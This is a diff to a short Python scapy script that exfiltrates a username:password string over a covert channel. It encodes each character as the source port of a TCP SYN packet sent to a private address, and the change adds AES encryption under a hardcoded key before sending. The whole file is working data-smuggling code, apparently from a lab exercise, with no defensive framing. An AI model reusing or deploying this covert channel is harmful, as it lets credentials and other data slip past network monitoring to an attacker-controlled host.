@@ -1,16 +1,31 @@
 #!/usr/bin/python -Btt
 
 import sys
+from Crypto.Cipher import AES
+from Crypto import Random
+from base64 import b64encode
 from time import sleep
 from scapy.all import *
+
+def encrypt(key, clear):
+	BLOCK_SIZE = 32
+	PADDING = '/'
+	pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
+	EncodeAES = lambda c, s: b64encode(c.encrypt(pad(s)))
+	cipher = AES.new(key)
+	msg = EncodeAES(cipher, clear)
+	return msg
 
 def main(argv):
 	packet = IP(dst='192.168.10.2')
 	segment = TCP(dport=80, flags=0x02)
-	
-	file = 'mrbaasman : P@s5w0Rt'
-	
-	for c in file:
+
+	key = ':Yjds52%9wnsjp>)'
+	clear = 'mrbaasman : P@s5w0Rt'
+	msg = encrypt(key, clear)
+
+	print msg
+	for c in msg:
 		segment = TCP(sport=ord(c) + 10000)
 		send(packet/segment)
 		sleep(1)
